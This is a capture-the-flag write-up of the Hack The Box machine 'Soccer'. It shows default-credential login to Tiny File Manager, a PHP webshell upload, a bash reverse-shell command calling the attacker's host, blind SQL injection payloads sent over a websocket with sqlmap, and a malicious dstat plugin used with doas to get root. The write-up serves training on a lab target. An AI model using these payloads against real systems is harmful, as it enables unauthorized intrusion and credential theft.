---
maquina: "Soccer"
dificultad: "Easy"
os: "Linux"
plataforma: "htb"
release: "17 Dec 2022"
retire: "10 Jun 2023"
creadores: "sau123"
htb_url: "https://hackthebox.com/machines/soccer"
app_url: "https://app.hackthebox.com/machines/519"
url: "https://0xdf.gitlab.io/2023/06/10/htb-soccer.html"
tipo: "htb"
en_lista_oscp: true
oscp_seccion: "htb"
---

Soccer starts with a website that is managed over Tiny File Manager. On finding the default credentials, I’ll use that to upload a webshell and get a shell on the box. With this foothold, I’ll identify a second virtual host with a new site. That site uses websockets to do a validation task. I’ll exploit an SQL injection over the websocket to leak a password and get a shell over SSH. The user is able to run dstat as root using doas, which I’ll exploit by crafting a malicious plugin.

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22), HTTP (80), and something HTTPish (9091):

```console
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.194
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-04 13:32 EDT
Nmap scan report for 10.10.11.194
Host is up (0.093s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail

Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds
oxdf@hacky$ nmap -p 22,80,9091 -sCV 10.10.11.194
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-04 13:32 EDT
Nmap scan report for 10.10.11.194
Host is up (0.093s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
...[snip]...
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.65 seconds
```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 focal.

The port 80 HTTP server shows a redirect to `soccer.htb`.

### Subdomain Brute Force

Given the use of potential host based routing, I’ll try to brute force the webserver on port 80 to see if it replies differently for any subdomains of `soccer.htb`. It doesn’t find anything:

```console
oxdf@hacky$ ffuf -u http://10.10.11.194 -H "Host: FUZZ.soccer.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.194
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.soccer.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 427 req/sec :: Duration: [0:00:47] :: Errors: 0 ::
```

Because port 9091 looks like a webserver as well, I can try that, but it doesn’t find anything either:

```console
oxdf@hacky$ ffuf -u http://10.10.11.194:9091 -H "Host: FUZZ.soccer.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.194:9091
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.soccer.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 431 req/sec :: Duration: [0:00:47] :: Errors: 0 ::
```

I’ll add `soccer.htb` to my `hosts` file:

```plaintext
10.10.11.194 soccer.htb
```

### soccer.htb - TCP 80

#### Site

The site is for the HTB FootBall Club:

![image-20230604134858470](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604134858470.png)

Click for full image

There are no links on the page.

#### Tech Stack

The HTTP headers don’t show much beyond nginx:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 04 Jun 2023 17:48:07 GMT
Content-Type: text/html
Last-Modified: Thu, 17 Nov 2022 08:07:11 GMT
Connection: close
ETag: W/"6375ebaf-1b05"
Content-Length: 6917
```

The page loads as `/index.html`, suggesting it may just be a static site. The page source doesn’t show anything interesting either.

The 404 page is a standard nginx 404:

![image-20230604135245436](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604135245436.png)

So there could be something else here, but it’s looking like a static site at this point.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```console
oxdf@hacky$ feroxbuster -u http://soccer.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soccer.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      711l     4253w   403502c http://soccer.htb/ground2.jpg
200      GET     2232l     4070w   223875c http://soccer.htb/ground4.jpg
200      GET      809l     5093w   490253c http://soccer.htb/ground1.jpg
200      GET      494l     1440w    96128c http://soccer.htb/ground3.jpg
200      GET      147l      526w     6917c http://soccer.htb/
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
[####################] - 1m     90021/90021   0s      found:7       errors:0
[####################] - 57s    30000/30000   521/s   http://soccer.htb/
[####################] - 56s    30000/30000   526/s   http://soccer.htb/tiny/
[####################] - 56s    30000/30000   528/s   http://soccer.htb/tiny/uploads/
```

It finds `/tiny` and `/tiny/uploads`.

#### Tiny File Manager

`/tiny` is an instance of Tiny File Manager:

![image-20230604140005575](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604140005575.png)

This is a common name for software, but searching for it with the term “CCP Programmers” finds the source [on GitHub](https://github.com/prasathmani/tinyfilemanager), where it describes itself as:

> TinyFileManager is web based PHP file manager and it is a simple, fast and small size in single-file PHP file that can be dropped into any folder on your server, multi-language ready web application for storing, uploading, editing and managing files and folders online via web browser. The Application runs on PHP 5.5+, It allows the creation of multiple users and each user can have its own directory and a built-in support for managing text files with cloud9 IDE and it supports syntax highlighting for over 150+ languages and over 35+ themes.

## Shell as www-data

### Authenticate to Tiny File Manager

On the README file, it gives the following instructions for how to set up Tiny File Manager:

> Download ZIP with latest version from master branch. Just copy the tinyfilemanager.php to your webspace - that’s all :) You can also change the file name from “tinyfilemanager.php” to something else, you know what i meant for. Default username/password: **admin/admin@123** and **user/12345**. Warning: Please set your own username and password in `$auth_users` before use. password is encrypted with `password_hash()`. to generate new password hash [on the TinyFileManager site](https://tinyfilemanager.github.io/docs/pwd.html) To enable/disable authentication set `$use_auth` to true or false. Add your own configuration file [config.php](https://tinyfilemanager.github.io/config-sample.txt) in the same folder to use as additional configuration file. To work offline without CDN resources, use [offline](https://github.com/prasathmani/tinyfilemanager/tree/offline) branch

That gives two sets of default credentials, “admin” / “admin@123” and “user” / “12345”. Both sets of creds work here. I’ll log in as admin.

### Tiny File Manager

Logged in, the page show the files that are part of the Soccer website:

![image-20230604142515207](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604142515207.png)

The URL is `http://soccer.htb/tiny/tinyfilemanager.php?p=`, which shows that the server is running PHP.

The `tiny` directory has the filemanager page, as well as the `uploads` directory:

![image-20230604142608344](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604142608344.png)

`uploads` is empty:

![image-20230604142623505](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604142623505.png)

### Shell

I’ll make a simple PHP webshell:

```php
<?php system($_REQUEST["cmd"]); ?>
```

I’ll use the “Upload” button, and it offers a way to upload:

![image-20230604142956658](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604142956658.png)

If I try to upload in `/var/www/html/`, it fails:

![image-20230604143018728](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604143018728.png)

If I navigate to `/tiny/uploads` and then click “Upload”, it works:

![image-20230604143115422](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604143115422.png)

The webshell provides execution:

```console
oxdf@hacky$ curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I’ll start `nc` listening on 443 on my host, and trigger a reverse shell by sending a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```console
oxdf@hacky$ curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261"'
```

It hangs, but there’s a connection at `nc`:

```console
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.194 55140
bash: cannot set terminal process group (1048): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soccer:~/html/tiny/uploads$
```

I’ll upgrade my shell using the `script` / `stty` [trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q).

## Shell as player

### Enumeration

#### Web Roots

The files in `/var/www/html` match what I observed via the file manager:

```console
www-data@soccer:~/html$ ls
football.jpg  ground2.jpg  ground4.jpg  tiny
ground1.jpg   ground3.jpg  index.html
```

There’s no database connection. The only credentials in the files are the users created for the Tiny File Manager:

```php
// Login user name and password
// Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
$auth_users = array(
    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345
);
```

#### Other Home Directories

There’s one home directory in `/home`, `player`:

```console
www-data@soccer:/home$ ls
player
```

`user.txt` is in that directory but www-data can’t read it:

```console
www-data@soccer:/home/player$ ls -la
total 28
drwxr-xr-x 3 player player 4096 Nov 28  2022 .
drwxr-xr-x 3 root   root   4096 Nov 17  2022 ..
lrwxrwxrwx 1 root   root      9 Nov 17  2022 .bash_history -> /dev/null
-rw-r--r-- 1 player player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 player player 3771 Feb 25  2020 .bashrc
drwx------ 2 player player 4096 Nov 17  2022 .cache
-rw-r--r-- 1 player player  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 Nov 17  2022 .viminfo -> /dev/null
-rw-r----- 1 root   player   33 Jun  4 17:29 user.txt
www-data@soccer:/home/player$ cat user.txt
cat: user.txt: Permission denied
```

#### Network / Processes

The `netstat` shows a few ports that weren’t available from the outside:

```console
www-data@soccer:/$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1089/nginx: worker
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      1089/nginx: worker
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

There’s still not much information about what 9091 could be. Port 3000 looks to be another web page:

```console
www-data@soccer:/$ curl localhost:3000
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
        <script src="/js/bootstrap.bundle.min.js"></script>
        <script src="/js/jquery.min.js"></script>
...[snip]...
```

3306 and 33060 both seem to be MySQL instances:

```console
www-data@soccer:/$ mysql -p 3306
Enter password:
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: YES)
www-data@soccer:/$ mysql -p 33060
Enter password:
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: YES)
```

It’s hard to verify any of this as www-data can only read it’s own processes:

```console
www-data@soccer:/$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
www-data    1089  0.0  0.1  54080  6176 ?        S    17:28   0:03 nginx: worker process
www-data    1090  0.0  0.1  54080  6492 ?        S    17:28   0:04 nginx: worker process
www-data    2385  0.0  0.0   2608   532 ?        S    18:50   0:00 sh -c bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"
www-data    2386  0.0  0.0   3976  2844 ?        S    18:50   0:00 bash -c bash -i >& /dev/tcp/10.10.14.6/443 0>&1
www-data    2387  0.0  0.0   4108  3484 ?        S    18:50   0:00 bash -i
www-data    2389  0.0  0.0   2636  2000 ?        S    18:50   0:00 script /dev/null -c bash
www-data    2390  0.0  0.0   2608   596 pts/1    Ss   18:50   0:00 sh -c bash
www-data    2391  0.0  0.0   4108  3596 pts/1    S    18:50   0:00 bash
www-data    2404  0.0  0.0   5892  2904 pts/1    R+   18:51   0:00 ps auxww
```

That is because `/proc` is mounted with `hidepid=2`:

```console
www-data@soccer:/$ mount | grep ^proc
proc on /proc type proc (rw,nodev,relatime,hidepid=2)
```

#### nginx

There’s nothing else of interest in the system root or `/opt` or `/srv`. I’ll look at how nginx is configured. There are two site files in `/etc/nginx/sites-enabled`:

```console
www-data@soccer:/etc/nginx/sites-enabled$ ls
default  soc-player.htb
```

`default` sets up the redirect to `soccer.htb`:

```json
server {
        listen 80;
        listen [::]:80;
        server_name 0.0.0.0;
        return 301 http://soccer.htb$request_uri;
}
```

It also configures the main site, allowing it PHP for PHP files:

```json
server {
        listen 80;
        listen [::]:80;

        server_name soccer.htb;

        root /var/www/html;
        index index.html tinyfilemanager.php;

        location / {
               try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        }

        location ~ /\.ht {
                deny all;
        }

}
```

`soc-player.htb` sets up another site that matches on the name `soc-player.soccer.htb`:

```json
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```

This webserver is hosted out of `/root/`, which is interesting, and passes to localhost 3000 (as observed previously).

I’ll update my `hosts` file:

```plaintext
10.10.11.194 soccer.htb soc-player.soccer.htb
```

### soc-player.soccer.htb

#### Site

This site looks exactly the same as the previous, except it has more options in the menu bar:

![image-20230604165704296](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604165704296.png)

Click for full image

“Match” has a page with a couple matches on it:

![image-20230604165746426](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604165746426.png)

It mentions a free ticket with login. I’ll register an account on the login:

![image-20230604165818394](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604165818394.png)

After logging in, it redirects to `/check`, where I get a ticket id:

![image-20230604165857513](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604165857513.png)

I can put a ticket id into the field and hit enter, and it tells me that the ticket exists:

![image-20230604170001242](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604170001242.png)

Or a different number does not exist:

![image-20230604170018474](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604170018474.png)

#### Tech Stack

The HTTP headers on this site show something different:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 04 Jun 2023 21:01:25 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/"1a5d-j2rGKcxb2vG5mw817o9kuCXUG9A"
Set-Cookie: connect.sid=s%3AfzlQ3aFEPfRhEXq51K_uqNvexNoR9nuY.%2BBeuQqYAry5y7q1Wccbld3alYHOkL0AmbBCA201JP5E; Path=/; HttpOnly
Content-Length: 6749
```

It’s running Express, a [NodeJS web framework](https://expressjs.com/).

#### Websockets

There’s another interesting request. Logging in submits a POST request to `/login`. On success, it returns a 302 redirect to `/check`. As that page is loading, it makes a request to `soc-player.soccer.htb:9091`, which returns a 101:

![image-20230604170632475](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604170632475.png)

HTTP 101 is a Switching Protocols response:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: 2lpCpI8gQ/C/eDaO6NMwOr0mrNs=
```

TCP 9091 is a websocket server. There’s no immediate messages shown in the “WebSockets history” tab in Burp. But once I check a ticket, there’s a message and a response:

![image-20230604170825371](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604170825371.png)

The sent message is simply JSON with the `id`:

![image-20230604170905237](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604170905237.png)

The response is just the text that is shown:

![image-20230604170926325](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604170926325.png)

### SQL Injection over Websockets

#### Identify

I’ll send one of the “To server” message to Burp Repeater and play around with it. Adding in a `'` doesn’t do anything other than return “Ticket Doesn’t Exist”. Any time I’m trying SQLI with an integer value, it’s worth trying without a `'` as well. The `'` is used to close strings, but if the input is being handled as an integer, perhaps just an ` or 1=1– -` will work (where `– -` is to comment out whatever follows). It does:

![image-20230604171233188](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604171233188.png)

There is no ticket 0, but it still returns exists because it pulls all rows.

#### Blind SQL Injection Background

This is a blind SQL injection - no data from the database comes back in the response, only one of two responses. The goal is to be able to ask questions of the database. For example, “is there a username that starts with ‘a’”?

To get there, first I’ll need to be able to picture the query being run on the system. It’s going to be something like:

```sql
SELECT * from ticket where id = {id};
```

If one or more rows return, then it says the ticket exists, else it doesn’t.

To make a test, there are a few ways I could structure a query. For manual testing, I prefer to use a `UNION` injection. I’ll send something that will return no rows, and then use a `UNION` to make another query, and then if that query returns rows, it will return that the “Ticket Exists”.

It’s also possible to make these queries using `OR foo=bar` to test, but I find those more difficult to think about when doing the manual approach.

I’ll also note that the app seems to handle query errors by returning “Ticket Doesn’t Exist” rather than crashing.

#### Manually Building a UNION

I need to know the number of columns returned from the query, because my `UNION` statement must return the same number, or it crashes. If I send one, it returns false:

![image-20230604210924721](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604210924721.png)

I’ll add more columns until it returns true at three columns:

![image-20230604210958963](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604210958963.png)

Now the query on the server looks like this:

```sql
SELECT * from ticket where id = 0 UNION SELECT 1,2,3;
```

The first select returns no row, and then my `UNION` returns the values 1, 2, 3, and it returns “Ticket Exists”.

#### Manually Asking a Question

Now to ask a question. In MySQL, there’s a `mysql.user` table with the users that can log into MySQL. I’m going to send this payload that will return true *if* there’s a user in that table that starts with “a”:

```json
{"id":"0 UNION select user,2,3 from mysql.user where user like 'a%'-- -"}
```

It returns false. There is likely a user named “root”, and changing “a” to “r”, it returns true:

![image-20230604211417121](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230604211417121.png)

With enough requests, any value from the table can be brute-forced one character at a time.

#### sqlmap

Doing all of this manually is impossible, so I’ll either have to write a script to do it, or find a tool. `sqlmap` is the perfect tool here, and it even works over websockets.

If `sqlmap` returns this error, it’s because the Python websockets library is missing:

```console
[21:17:13] [CRITICAL] sqlmap requires third-party module 'websocket-client' in order to use WebSocket functionality
```

Or if `sqlmap` returns this error, it’s because the wrong websockets library is installed:

```console
[21:18:30] [ERROR] wrong modification time of '/usr/share/sqlmap/sqlmapapi.py'
[21:18:30] [ERROR] wrong modification time of '/usr/share/sqlmap/sqlmap.py'
[21:18:30] [ERROR] wrong modification time of '/usr/share/sqlmap/thirdparty/identywaf/identYwaf.py'
[21:18:30] [CRITICAL] wrong websocket library detected (Reference: 'https://github.com/sqlmapproject/sqlmap/issues/4572#issuecomment-77504
1086')
```

Either of these are fixed with `pip install websocket-client`.

I’ll give it the following arguments:

- `-u "ws://soc-player.soccer.htb:9091"` - The URL to connect to.
- `--data '{"id": "1234"}'` - The data to send.
- `--dbms mysql` - Tell `sqlmap` that it’s running MySQL.
- `--batch` - Take the default answer on all questions.
- `--level 5 --risk 3` - Increase to the most aggressive to find the boolean injection (without this it just finds a time-based injection, which is really slow).

It finds a time-based injection, and then finds the three column `UNION`-based boolean as well:

```console
oxdf@hacky$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --lev
el 5 --risk 3
...[snip]...
[21:24:42] [INFO] testing connection to the target URL
...[snip]...
[21:30:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[21:30:32] [INFO] (custom) POST parameter 'JSON id' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable
...[snip]...
[21:30:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:30:56] [INFO] (custom) POST parameter 'JSON id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
...[snip]...
[21:32:28] [INFO] checking if the injection point on (custom) POST parameter 'JSON id' is a false positive
(custom) POST parameter 'JSON id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 373 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"id": "-1533 OR 9982=9982"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id": "1234 AND (SELECT 5403 FROM (SELECT(SLEEP(5)))gMBy)"}
---
[21:32:37] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
...[snip]...
```

It’s using the `OR` structure for boolean rather than `UNION`.

### Enumerate DB

#### List Databases

Now that `sqlmap` has found an injection, I’ll up-arrow and add `--dbs` to the previous command. Theads are safe to do in a boolean injection, so I’ll add `--threads 10` to speed it up. It will pick up where it left off and list the available databases:

```console
oxdf@hacky$ sqlmap -u ws://soc-player.soccer.htb:9091 --dbs --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10
...[snip]...
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
...[snip]...
```

#### List Tables in soccer_db

`soccer_db` seems like the only non-default DB. I’ll replace `--dbs` with `-D soccer_db` to specify that database and then add `--tables` to list the tables:

```console
oxdf@hacky$ sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db --tables --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10
...[snip]...
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
...[snip]...
```

There’s only one.

#### Dump accounts

In general, with boolean and time-based SQL injections, I want to be careful about dumping tons of data, as it will be very slow. That said, since there’s only one table, I want the entire thing, so I’ll replace `--tables` with `-T accounts` and add `--dump`. It dumps the table:

```console
oxdf@hacky$ sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db -T accounts --dump --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10
...[snip]...
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
...[snip]...
```

The user is player and the password is in plaintext.

### su / SSH

That password works for the player user on the box with `su`:

```console
www-data@soccer:/home/player$ su player -
Password:
player@soccer:~$
```

It works for SSH as well:

```console
oxdf@hacky$ sshpass -p PlayerOftheMatch2022 ssh player@soccer.htb
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
...[snip]...
player@soccer:~$
```

Either way I’ll grab `user.txt`:

```console
player@soccer:~$ cat user.txt
df7f36e9************************
```

## Shell as root

### Enumeration

#### sudo / doas

The first check on Linux is always `sudo`, but nothing set up for player on Soccer:

```console
player@soccer:~$ sudo -l
[sudo] password for player:
Sorry, user player may not run sudo on localhost.
```

However, in looking for SetUID binaries, the first one jumps out:

```console
player@soccer:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
...[snip]...
```

`doas` is an alternative to `sudo` typically found on OpenBSD operating systems, but that can be installed on Debian-base Linux OSes like Ubuntu.

#### doas Config

I don’t see a `doas.conf` file in `/etc`, so I’ll search the filesystem for it with `find`:

```console
player@soccer:~$ find / -name doas.conf 2>/dev/null
/usr/local/etc/doas.conf
```

It has one line:

```console
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

player can run the command `dstat` as root.

### dstat

#### man Page

`dstat` is a tool for getting system information. Looking at the [man page](https://linux.die.net/man/1/dstat), there’s a section on plugins that says:

> While anyone can create their own dstat plugins (and contribute them) dstat ships with a number of plugins already that extend its capabilities greatly.

At the very bottom of the page, it has a section on files:

> Paths that may contain external dstat_*.py plugins: `~/.dstat/
> (path of binary)/plugins/
> /usr/share/dstat/
> /usr/local/share/dstat/`

Plugins are Python scripts with the name `dstat_[plugin name].py`.

#### Malicious Plugin

I’ll write a very simple plugin:

```python
import os

os.system("/bin/bash")
```

This will drop into Bash for an interactive shell.

Looking at the list of locations, I can obviously write to `~/.dstat`, but when run with `doas`, it’ll be running as root, and therefore won’t check `/home/player/.dstat`. Luckily, `/usr/local/share/dstat` is writable.

```console
player@soccer:~$ echo -e 'import os\n\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_0xdf.py
```

With that in place, I’ll invoke `dstat` with the `0xdf` plugin:

```console
player@soccer:~$ doas /usr/bin/dstat --0xdf
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/home/player#
```

And grab the flag:

```console
root@soccer:~# cat root.txt
774a30b5************************
```
